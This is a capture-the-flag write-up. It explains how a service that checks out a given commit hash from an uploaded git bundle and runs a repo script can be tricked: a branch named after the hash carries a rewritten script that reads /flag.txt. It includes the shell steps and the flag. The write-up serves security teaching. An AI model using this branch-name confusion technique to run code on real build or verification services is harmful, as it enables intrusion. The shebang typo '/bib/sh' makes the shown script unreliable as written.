## Vulnerability Explanation

The solution consists of noticing four key lines in main.py

1- Check if commit hash 037a118c4020f15c933b269580894e6587802818 exists in the bundle input

```python
subprocess.run(
                ["git", "rev-list", "037a118c4020f15c933b269580894e6587802818"],
                cwd=local_dir,
                capture_output=True,
                text=True,
                check=False
)
```

2- Checkout to this commit hash

```python
subprocess.run(
                ["git", "checkout", "037a118c4020f15c933b269580894e6587802818"],
                cwd=local_dir,
                capture_output=True,
                text=True,
                check=False
)
```

This will be exploited to checkout to a branch with name 037a118c4020f15c933b269580894e6587802818 that we control

3- Run `RunCICDChecks` script

```python
subprocess.run(
                ["./RunCICDChecks"],
                cwd=local_dir,
                capture_output=True,
                text=True,
                check=False
)
```

4- Embed the output of the previous command in result.html

```python
output = run_result.stdout.strip() or "Verification completed successfully!"
                return templates.TemplateResponse(
                    "result.html",
                    {
                        "request": request,
                        "success": True,
                        "output": output
                    }
)
```

## Exploitation Steps

Our workflow goes as follow:

1- Clone the repo that we are talking about in the challenge description

```bash
git clone https://github.com/mahdicalvine/University-Project.git
```

This will lead us to bypass the check on step 1 which is commit hash check

2- Create a branch with the exact commit hash (`037a118c4020f15c933b269580894e6587802818`)

```bash
git branch 037a118c4020f15c933b269580894e6587802818 && git checkout 037a118c4020f15c933b269580894e6587802818
```

3- Over write `RunCICDChecks` content with something like `cat /flag.txt`, commit then bundle

```bash
cat > RunCICDChecks <<EOF
#! /bib/sh

cat /flag.txt
EOF
```

Another thing to consider is to make the script executable before commiting, so

```bash
chmod +x RunCICDChecks
```

Then

```bash
git add . && git commit -m "Pwned"
```

4- Bunlde the repo

```bash
git bundle create malicious.bundle --all
```

### Flag: ghctf{d1dnt_m1ss_y0uR_61t_617hub_w0rksh0p_r1gh7???}
